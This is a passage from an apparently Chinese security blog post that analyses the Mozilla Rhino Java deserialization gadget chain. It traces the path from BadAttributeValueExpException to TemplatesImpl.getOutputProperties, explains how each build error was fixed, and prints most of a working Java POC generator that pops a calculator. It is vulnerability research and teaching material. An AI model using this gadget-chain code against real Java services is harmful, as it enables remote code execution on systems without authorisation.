<p>继续跟进 <code>readMember()</code> 函数，就是一个反序列化的实现。因此，通过反序列化给 <code>memberObject</code>的赋值，不存在问题。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/21-MemberBox.readMember.png" alt="MemberBox.readMember"></p>
<p>也就是说，我们可以通过反序列化给 <code>meth</code> 赋值为期望的目标函数。</p>
<p><strong>结论</strong></p>
<p>设置 <code>NativeJavaMethod.call()</code> 中的 <code>meth</code> 需要：</p>
<ul>
<li>构造 <code>MemberBox</code> 对象 m</li>
<li>设置 m 的成员变量 <code>memberObject</code> 为目标函数</li>
<li>构造 <code>NativeJavaMethod</code> 对象 n</li>
<li>设置 n 的成员变量 <code>methods</code> 的 0 号元素为 m</li>
</ul>
<p><strong>3、</strong> javaObject 涉及的代码，都在 <code>NativeJavaMethod.call()</code> 的 222~247 行。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/22-NativeJavaMethod-javaObject.png" alt="NativeJavaMethod-javaObject"></p>
<p>关键的部分就是 225~242 行的 <code>else</code> 分支里。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/23-NativeJavaMethod.else.branch.png" alt="NativeJavaMethod.else.branch"></p>
<p>如果要把 <code>javaObject</code> 赋值为我们期望的对象，就是要在 235 行完成这个赋值。但是这里有一个问题：我们知道 <code>thisObj</code> 就是 <code>NativeError</code> 对象，同理 <code>o</code> 也是。但 <code>NativeError</code> 没有实现 <code>Wrapper</code> 接口，这样一来 234 行的判断条件 <code>if (o instanceof Wrapper)</code> 就不能满足了。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/24-for-o-Wrapper.png" alt="for-o-Wrapper"></p>
<p>转机在于，这个判断身处循环之中，240 行的 <code>o = o.getPrototype()</code> 给了我们希望。查看一下 <code>Wrapper</code> 的实现类。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/25-Wrapper-classes.png" alt="Wrapper-classes"></p>
<p>看下 <code>NativeJavaObject</code> 的 <code>unwrap()</code> 函数，直接返回了 <code>NativeJavaObject.javaObject</code> 成员变量。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/26-NativeJavaObject-unwrap.png" alt="NativeJavaObject-unwrap"></p>
<p>而 <code>NativeJavaObject.javaObject</code> 成员变量可以通过反序列化的 <code>readObject()</code> 函数直接赋值。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/27-NativeJavaObject-readObject.png" alt="NativeJavaObject-readObject"></p>
<p>也就是说，如果我们让 <code>NativeError</code> 对象的 <code>getPrototype()</code> 返回特定的 <code>NativeJavaObject</code> 对象，就可以完成 <code>javaObject</code> 的赋值。看看 <code>getPrototype()</code> 的实现，在 <code>ScriptableObject</code> 类中。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/28-ScriptableObject-getPrototype.png" alt="ScriptableObject-getPrototype"></p>
<p>这个 <code>prototypeObject</code> 来自 ScriptableObject 的成员变量，可以通过反序列化赋值。 </p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/29-ScriptableObject.prototypeObject.png" alt="ScriptableObject.prototypeObject"></p>
<p><strong>结论</strong></p>
<p>设置 <code>NativeJavaMethod.call()</code> 中的 <code>javaObject</code> 需要：</p>
<ul>
<li>构造 <code>NativeJavaObject</code> 对象 o</li>
<li>设置 o 的成员变量 <code>javaObject</code> 为目标对象</li>
<li>构造 <code>NativeError</code> 对象 e</li>
<li>设置 e 的成员变量 <code>prototypeObject</code> 为 o </li>
</ul>
<p><strong>4、</strong> 最后看一下 <code>args</code>。<code>args</code>来自入参，其实就是调用者传入的 <code>ScriptRuntime.emptyArgs</code>。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/30-NativeJavaMethod.args.png" alt="NativeJavaMethod.args"></p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/31-ScriptableObject.emptyArgs.png" alt="ScriptableObject.emptyArgs"></p>
<p>这就决定我们要寻找的目标函数，必须是一个<strong>无参函数</strong>。</p>
<p><strong>5、</strong> 再回到开头，通常反序列化的入口都是 <code>readObject()</code> 函数，而文章开头说 <code>NativeError</code> 的反序列化入口在 <code>toString()</code> 函数。怎么才能从 <code>readObject()</code> 入口转到 <code>NativeError.toString()</code> 呢？</p>
<p>答案就在 JDK 中的 <code>BadAttributeValueExpException</code> 类的 <code>readObject()</code> 函数。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/32-BadAttributeValueExpException-readObject.png" alt="BadAttributeValueExpException-readObject"></p>
<p>也就是说，只要将 <code>BadAttributeValueExpException</code> 的 <code>val</code> 设置为 <code>NativeError</code> 对象，就可以在反序列化的过程中调用 <code>NativeError.toString()</code> 了。</p>
<p><strong>6、结论</strong> </p>
<p>如果要完成反序列化POC，需要：</p>
<ul>
<li>构造 <code>MemberBox</code> 对象 m</li>
<li>设置 m 的成员变量 <code>memberObject</code> 为目标函数</li>
<li>构造 <code>NativeJavaMethod</code> 对象 n</li>
<li>设置 n 的成员变量 <code>methods</code> 的 0 号元素为 m</li>
<li>构造 <code>NativeJavaObject</code> 对象 o</li>
<li>设置 o 的成员变量 <code>javaObject</code> 为目标对象</li>
<li>构造 <code>NativeError</code> 对象 a</li>
<li>设置 a 的成员变量 <code>prototypeObject</code> 为 o </li>
<li>通过 a 的 <code>setGetterOrSetter()</code> 函数，设置 a 的 <code>getter</code> 属性为对象 n</li>
<li>构造 <code>BadAttributeValueExpException</code> 对象 b</li>
<li>设置 b 的成员变量 <code>val</code> 为 <code>NativeError</code> 对象 a</li>
</ul>
<p>前面说过，需要寻找的目标函数，应当是一个无参函数。同时，这个无参函数所属的目标类，还得是实现了 <code>Serializable</code> 接口、支持序列化和反序列化的类。</p>
<p>因此，首先想到的就是，使用 <code>TemplatesImpl</code> 类作为目标类，使用它的 <code>getOutputProperties()</code> 作为目标函数。</p>
<h2 id="二、填坑"><a href="#二、填坑" class="headerlink" title="二、填坑"></a>二、填坑</h2><p>完成了上述分析，我们开始写POC。途中暗坑无数，逐一填之。</p>
<h3 id="1、NativeError-无法实例化"><a href="#1、NativeError-无法实例化" class="headerlink" title="1、NativeError 无法实例化"></a>1、<code>NativeError</code> 无法实例化</h3><p>声明 <code>NativeError</code> 对象，直接报错：<code>The type NativeError is not visible</code>。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/33-Error-NativeError.png" alt="Error-NativeError"></p>
<p><strong>报错原因：</strong></p>
<p> <code>NativeError</code> 类不是 <code>public</code>，不能直接引用。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/34-Reason-NativeError.png" alt="Reason-NativeError"></p>
<p><strong>解决方案：</strong></p>
<p>通过反射，实例化 <code>NativeError</code> 对象。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/35-Solution-New-NativeError.png" alt="Solution-New-NativeError"></p>
<h3 id="2、反射实例化的-NativeError-运行失败"><a href="#2、反射实例化的-NativeError-运行失败" class="headerlink" title="2、反射实例化的 NativeError 运行失败"></a>2、反射实例化的 <code>NativeError</code> 运行失败</h3><p>运行这段代码：</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/36-Error-Run-new-instance.png" alt="Error-Run-new-instance"></p>
<p>报错 “ Class com.xiang.rhinotest.RhinoPoc can not access a member of class org.mozilla.javascript.NativeError with modifiers “” ”</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/37-Error-Access-NativeError.png" alt="Error-Access-NativeError"></p>
<p><strong>报错原因：</strong></p>
<p><code>NativeError</code> 没有提供默认的public 无参构造函数，无法直接调用 newInstance()。</p>
<p><strong>解决方案：</strong></p>
<p>通过反射设置构造函数为 public，再进行调用。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/38-Solution-setAccessible.png" alt="Solution-setAccessible"></p>
<p>反射在 ysoserial 中被大量的使用，原因也就在此。</p>
<h3 id="3、执行POC失败：No-Context"><a href="#3、执行POC失败：No-Context" class="headerlink" title="3、执行POC失败：No Context"></a>3、执行POC失败：No Context</h3><p>按照“分析”部分的结论，结合大量的反射调用，完成POC如下。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title">generate_Object</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//构造 NativeError 对象 a</span></span><br><span class="line">    Object nativeError;</span><br><span class="line">    &#123;</span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">"org.mozilla.javascript.NativeError"</span>);</span><br><span class="line">        Constructor&lt;?&gt; cons = cls.getDeclaredConstructor();</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        nativeError = cons.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//构造 NativeJavaObject 对象 o</span></span><br><span class="line">    <span class="comment">//设置 o 的成员变量 javaObject 为目标对象</span></span><br><span class="line">    <span class="comment">//设置 a 的成员变量 prototypeObject 为 o</span></span><br><span class="line">    TemplatesImpl templatesImpl = TemplatesImplGadget.get();</span><br><span class="line">    &#123;</span><br><span class="line">        Context context = Context.enter();</span><br><span class="line">        NativeObject scriptableObject = (NativeObject) context.initStandardObjects();</span><br><span class="line">        NativeJavaObject nativeJavaObject = <span class="keyword">new</span> NativeJavaObject(scriptableObject, templatesImpl, TemplatesImpl.class);</span><br><span class="line">        Method method = nativeError.getClass().getMethod(<span class="string">"setPrototype"</span>, <span class="keyword">new</span> Class&lt;?&gt;[]&#123;Scriptable.class&#125;);</span><br><span class="line">        method.invoke(nativeError, <span class="keyword">new</span> Object[]&#123;nativeJavaObject&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//构造 MemberBox 对象 m</span></span><br><span class="line">    <span class="comment">//设置 m 的成员变量 memberObject 为目标函数</span></span><br><span class="line">    <span class="comment">//构造 NativeJavaMethod 对象 n</span></span><br><span class="line">    <span class="comment">//设置 n 的成员变量 methods 的 0 号元素为 m   </span></span><br><span class="line">    <span class="comment">//通过 a 的 setGetterOrSetter() 函数，设置 a 的 getter 属性为对象 n</span></span><br><span class="line">    Method getOutputProperties = templatesImpl.getClass().getMethod(<span class="string">"getOutputProperties"</span>, <span class="keyword">new</span> Class&lt;?&gt;[<span class="number">0</span>]);</span><br><span class="line">    &#123; </span><br><span class="line">        NativeJavaMethod nativeJavaFunction = <span class="keyword">new</span> NativeJavaMethod(getOutputProperties, <span class="keyword">null</span>);</span><br><span class="line">        Method method = nativeError.getClass().getMethod(<span class="string">"setGetterOrSetter"</span>, <span class="keyword">new</span> Class&lt;?&gt;[]&#123;String.class, <span class="keyword">int</span>.class, Callable.class, <span class="keyword">boolean</span>.class&#125;);</span><br><span class="line">      method.invoke(nativeError, <span class="keyword">new</span> Object[]&#123;<span class="string">"name"</span>, <span class="number">0</span>, nativeJavaFunction, <span class="keyword">false</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//构造 BadAttributeValueExpException 对象 b</span></span><br><span class="line">    <span class="comment">//设置 b 的成员变量 val 为 NativeError 对象 a</span></span><br><span class="line">    BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>); </span><br><span class="line">    &#123;</span><br><span class="line">        Field valField = badAttributeValueExpException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        valField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valField.set(badAttributeValueExpException, nativeError);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> badAttributeValueExpException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译运行。呃，序列化成功，可是反序列化的时候却没看到计算器，只看到了报错：“No Context associated with current Thread”。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/39-Error-no-context.png" alt="Error-no-context"></p>
<p><strong>报错原因：</strong></p>
<p>问题在哪里呢？就在 <code>ScriptableObject.getImpl()</code> 的 else 分支中。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/40-Reason-no-context.png" alt="Reason-no-context"></p>
<p>我们期望进入 2024 行的 <code>f.call()</code>，结果在 2023 行 <code>Context.getContext()</code> 抛出了异常，因为 Context 对象为空。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/41-Reason-Context-null.png" alt="Reason-Context-null"></p>
<p>构造 <code>Context</code> 需要调用 <code>Context.enter()</code> 函数。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/42-Context-enter.png" alt="Context-enter"><br><img src="https://yaowendao.cn-bj.ufileos.com/43-Context-enter-2.png" alt="Context-enter-2"></p>
<p>怎样在反序列化的时候插入 <code>Context.enter()</code> 的调用呢？</p>
<p>重新看下调用栈，发现 <code>NativeError.js_toString()</code> 调用了两次 <code>getString()</code> 函数，分别传入字符串 “name”和“message”。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/02-js_toString.png" alt="NativeError.js_toString"> </p>
<p>因此，我们可以把 <code>TemplatesImpl.getOutputProperties()</code> 作为 “message”的属性，把 <code>Context.enter()</code> 作为 “name” 的属性，这样就可以先执行 <code>Context.enter()</code>，再执行  <code>TemplatesImpl.getOutputProperties()</code> 进行 Payload 执行。</p>
<p><strong>解决方案：</strong></p>
<p>按照 POC 中设置 <code>TemplatesImpl.getOutputProperties()</code> 的方法，设置 <code>Context.enter()</code> 为 “name” 属性，将 <code>TemplatesImpl.getOutputProperties()</code> 设置为 “message” 属性</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//构造 MemberBox 对象 m</span></span><br><span class="line"><span class="comment">//设置 m 的成员变量 memberObject 为目标函数</span></span><br><span class="line"><span class="comment">//构造 NativeJavaMethod 对象 n</span></span><br><span class="line"><span class="comment">//设置 n 的成员变量 methods 的 0 号元素为 m   </span></span><br><span class="line"><span class="comment">//通过 a 的 setGetterOrSetter() 函数，设置 a 的 getter 属性为对象 n</span></span><br><span class="line">Method getOutputProperties = templatesImpl.getClass().getMethod(<span class="string">"getOutputProperties"</span>, <span class="keyword">new</span> Class&lt;?&gt;[<span class="number">0</span>]);</span><br><span class="line">&#123; </span><br><span class="line">    NativeJavaMethod nativeJavaFunction = <span class="keyword">new</span> NativeJavaMethod(getOutputProperties, <span class="keyword">null</span>);</span><br><span class="line">    Method method = nativeError.getClass().getMethod(<span class="string">"setGetterOrSetter"</span>, <span class="keyword">new</span> Class&lt;?&gt;[]&#123;String.class, <span class="keyword">int</span>.class, Callable.class, <span class="keyword">boolean</span>.class&#125;);</span><br><span class="line">    method.invoke(nativeError, <span class="keyword">new</span> Object[]&#123;<span class="string">"messsage"</span>, <span class="number">0</span>, nativeJavaFunction, <span class="keyword">false</span>&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造 MemberBox 对象 m2</span></span><br><span class="line"><span class="comment">//设置 m2 的成员变量 memberObject 为 Context.enter()</span></span><br><span class="line"><span class="comment">//构造 NativeJavaMethod 对象 n2</span></span><br><span class="line"><span class="comment">//设置 n2 的成员变量 methods 的 0 号元素为 m2   </span></span><br><span class="line"><span class="comment">//通过 a 的 setGetterOrSetter() 函数，设置 a 的 getter 属性为对象 n2</span></span><br><span class="line">Method enterMethod = Context.class.getMethod(<span class="string">"enter"</span>, <span class="keyword">new</span> Class&lt;?&gt;[<span class="number">0</span>]);</span><br><span class="line">&#123;</span><br><span class="line">    NativeJavaMethod nativeJavaFunction = <span class="keyword">new</span> NativeJavaMethod(enterMethod, <span class="keyword">null</span>);</span><br><span class="line">    Method method = nativeError.getClass().getMethod(<span class="string">"setGetterOrSetter"</span>, <span class="keyword">new</span> Class&lt;?&gt;[]&#123;String.class, <span class="keyword">int</span>.class, Callable.class, <span class="keyword">boolean</span>.class&#125;);</span><br><span class="line">    method.invoke(nativeError, <span class="keyword">new</span> Object[]&#123;<span class="string">"name"</span>, <span class="number">0</span>, nativeJavaFunction, <span class="keyword">false</span>&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="4、执行POC仍然失败：No-Context"><a href="#4、执行POC仍然失败：No-Context" class="headerlink" title="4、执行POC仍然失败：No Context"></a>4、执行POC仍然失败：No Context</h3><p>增加 <code>Context.enter()</code> 的调用之后，重新运行POC，呃，问题依旧……</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/44-Error-no-context.png" alt="Error-no-context"></p>
<p><strong>报错原因：</strong></p>
<p>为什么新增的调用无效呢？因为设置函数的方法错了。</p>
<p>无论是 <code>TemplatesImpl.getOutputProperties()</code> 还是 <code>Context.enter()</code> ，我们都是通过 <code>ScriptableObject.setGetterOrSetter()</code> 函数进行设置。而这个函数设置的 <code>getter</code> 属性，是 <code>Callable</code> 类型的。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/45-ScriptalbeObject-setGetterOrSetter.png" alt="ScriptalbeObject-setGetterOrSetter"></p>
<p>回到报错的地方看。 2009 行 if 分支的判断条件是，<code>getter</code> 属性的值必须是 <code>MemberBox</code> 类型，而 <code>MemberBox</code> 并没有实现 <code>Callable</code> 接口，所以无论进来的是<code>TemplatesImpl.getOutputProperties()</code> 还是 <code>Context.enter()</code>，代码流程都会走到 2021 行的 else 分支中。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/40-Reason-no-context.png" alt="Reason-no-context"></p>
<p>我们期望流程走到 2024 行的 <code>f.call()</code>，遇到的问题是在 2023 行就报错了。我们增加 <code>Context.enter()</code> 的调用，期望他能解决无法通过 <code>f.call()</code> 来调用<code>TemplatesImpl.getOutputProperties()</code> 的问题。</p>
<p>但是对 <code>Context.enter()</code> 的调用遇到了一样的问题，在 2023 行就抛出了异常，无法走到 2024 行去执行我们期望的函数。</p>
<p>所以，对 <code>Context.enter()</code> 的设置，就不能像 <code>TemplatesImpl.getOutputProperties()</code> 一样，去通过 <code>ScriptableObject.setGetterOrSetter()</code> 函数进行设置，只能让他通过 2009 行的 if 分支去调用。但是要怎么去设置呢？ysoserial 通过反射进行强制设置 <code>getter</code> 属性来解决这个问题。</p>
<p><strong>解决方案：</strong></p>
<p>参考 ysoserial 中的方法，通过反射进行强制设置 <code>getter</code> 属性为 MemberBox 对象的 <code>Context.enter()</code> 方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//构造 MemberBox 对象 m2</span></span><br><span class="line"><span class="comment">//设置 m2 的成员变量 memberObject 为 Context.enter()</span></span><br><span class="line"><span class="comment">//构造 NativeJavaMethod 对象 n2</span></span><br><span class="line"><span class="comment">//设置 n2 的成员变量 methods 的 0 号元素为 m2   </span></span><br><span class="line"><span class="comment">//通过 a 的 setGetterOrSetter() 函数，设置 a 的 getter 属性为对象 n2</span></span><br><span class="line">Method enterMethod = Context.class.getMethod(<span class="string">"enter"</span>, <span class="keyword">new</span> Class&lt;?&gt;[<span class="number">0</span>]);</span><br><span class="line">&#123;</span><br><span class="line">    NativeJavaMethod nativeJavaFunction = <span class="keyword">new</span> NativeJavaMethod(enterMethod, <span class="keyword">null</span>);</span><br><span class="line">    Method method = nativeError.getClass().getMethod(<span class="string">"setGetterOrSetter"</span>, <span class="keyword">new</span> Class&lt;?&gt;[]&#123;String.class, <span class="keyword">int</span>.class, Callable.class, <span class="keyword">boolean</span>.class&#125;);</span><br><span class="line">    method.invoke(nativeError, <span class="keyword">new</span> Object[]&#123;<span class="string">"name"</span>, <span class="number">0</span>, nativeJavaFunction, <span class="keyword">false</span>&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过反射强行设置 getter 属性为 MemberBox 对象的 Context.enter() 函数</span></span><br><span class="line">&#123;</span><br><span class="line">    Method getSlot = ScriptableObject.class.getDeclaredMethod(<span class="string">"getSlot"</span>, <span class="keyword">new</span> Class&lt;?&gt;[]&#123;String.class, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class&#125;);</span><br><span class="line">    getSlot.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Object slot  = getSlot.invoke(nativeError, <span class="string">"name"</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    Field getter = slot.getClass().getDeclaredField(<span class="string">"getter"</span>);</span><br><span class="line">    getter.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; memberboxClass = Class.forName(<span class="string">"org.mozilla.javascript.MemberBox"</span>);</span><br><span class="line">    Constructor&lt;?&gt; memberboxClassConstructor = memberboxClass.getDeclaredConstructor(Method.class);</span><br><span class="line">    memberboxClassConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Object memberboxes = memberboxClassConstructor.newInstance(enterMethod);</span><br><span class="line">    getter.set(slot, memberboxes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>现在再执行 POC，终于可以看到计算器了。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/46-calc.png" alt="calc"></p>
<h2 id="三、POC"><a href="#三、POC" class="headerlink" title="三、POC"></a>三、POC</h2><p>完整POC参见 <a href="https://github.com/yaojieno1/rhinoPoc" target="_blank" rel="noopener">Github</a>。</p>
<p>主要函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title">generate_Object</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//构造 NativeError 对象 a</span></span><br><span class="line">    Object nativeError;</span><br><span class="line">    &#123;</span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">"org.mozilla.javascript.NativeError"</span>);</span><br><span class="line">        Constructor&lt;?&gt; cons = cls.getDeclaredConstructor();</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        nativeError = cons.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//构造 NativeJavaObject 对象 o</span></span><br><span class="line">    <span class="comment">//设置 o 的成员变量 javaObject 为目标对象</span></span><br><span class="line">    <span class="comment">//设置 a 的成员变量 prototypeObject 为 o</span></span><br><span class="line">    TemplatesImpl templatesImpl = TemplatesImplGadget.get();</span><br><span class="line">    &#123;</span><br><span class="line">        Context context = Context.enter();</span><br><span class="line">        NativeObject scriptableObject = (NativeObject) context.initStandardObjects();</span><br><span class="line">        NativeJavaObject nativeJavaObject = <span class="keyword">new</span> NativeJavaObject(scriptableObject, templatesImpl, TemplatesImpl.class);</span><br><span class="line">        Method method = nativeError.getClass().getMethod(<span class="string">"setPrototype"</span>, <span class="keyword">new</span> Class&lt;?&gt;[]&#123;Scriptable.class&#125;);</span><br><span class="line">        method.invoke(nativeError, <span class="keyword">new</span> Object[]&#123;nativeJavaObject&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//构造 MemberBox 对象 m</span></span><br><span class="line">    <span class="comment">//设置 m 的成员变量 memberObject 为目标函数</span></span><br><span class="line">    <span class="comment">//构造 NativeJavaMethod 对象 n</span></span><br><span class="line">    <span class="comment">//设置 n 的成员变量 methods 的 0 号元素为 m   </span></span><br><span class="line">    <span class="comment">//通过 a 的 setGetterOrSetter() 函数，设置 a 的 getter 属性为对象 n</span></span><br><span class="line">    Method getOutputProperties = templatesImpl.getClass().getMethod(<span class="string">"getOutputProperties"</span>, <span class="keyword">new</span> Class&lt;?&gt;[<span class="number">0</span>]);</span><br><span class="line">    &#123; </span><br><span class="line">        NativeJavaMethod nativeJavaFunction = <span class="keyword">new</span> NativeJavaMethod(getOutputProperties, <span class="keyword">null</span>);</span><br><span class="line">        Method method = nativeError.getClass().getMethod(<span class="string">"setGetterOrSetter"</span>, <span class="keyword">new</span> Class&lt;?&gt;[]&#123;String.class, <span class="keyword">int</span>.class, Callable.class, <span class="keyword">boolean</span>.class&#125;);</span><br><span class="line">        method.invoke(nativeError, <span class="keyword">new</span> Object[]&#123;<span class="string">"message"</span>, <span class="number">0</span>, nativeJavaFunction, <span class="keyword">false</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//构造 MemberBox 对象 m2</span></span><br><span class="line">    <span class="comment">//设置 m2 的成员变量 memberObject 为 Context.enter()</span></span><br><span class="line">    <span class="comment">//构造 NativeJavaMethod 对象 n2</span></span><br><span class="line">    <span class="comment">//设置 n2 的成员变量 methods 的 0 号元素为 m2   </span></span><br><span class="line">    <span class="comment">//通过 a 的 setGetterOrSetter() 函数，设置 a 的 getter 属性为对象 n2</span></span><br><span class="line">    Method enterMethod = Context.class.getMethod(<span class="string">"enter"</span>, <span class="keyword">new</span> Class&lt;?&gt;[<span class="number">0</span>]);</span><br><span class="line">    &#123;</span><br><span class="line">        NativeJavaMethod nativeJavaFunction = <span class="keyword">new</span> NativeJavaMethod(enterMethod, <span class="keyword">null</span>);</span><br><span class="line">        Method method = nativeError.getClass().getMethod(<span class="string">"setGetterOrSetter"</span>, <span class="keyword">new</span> Class&lt;?&gt;[]&#123;String.class, <span class="keyword">int</span>.class, Callable.class, <span class="keyword">boolean</span>.class&#125;);</span><br><span class="line">        method.invoke(nativeError, <span class="keyword">new</span> Object[]&#123;<span class="string">"name"</span>, <span class="number">0</span>, nativeJavaFunction, <span class="keyword">false</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//通过反射强行设置 getter 属性为 MemberBox 对象的 Context.enter() 函数</span></span><br><span class="line">    &#123;</span><br><span class="line">        Method getSlot = ScriptableObject.class.getDeclaredMethod(<span class="string">"getSlot"</span>, <span class="keyword">new</span> Class&lt;?&gt;[]&#123;String.class, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class&#125;);</span><br><span class="line">        getSlot.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object slot  = getSlot.invoke(nativeError, <span class="string">"name"</span>, <span 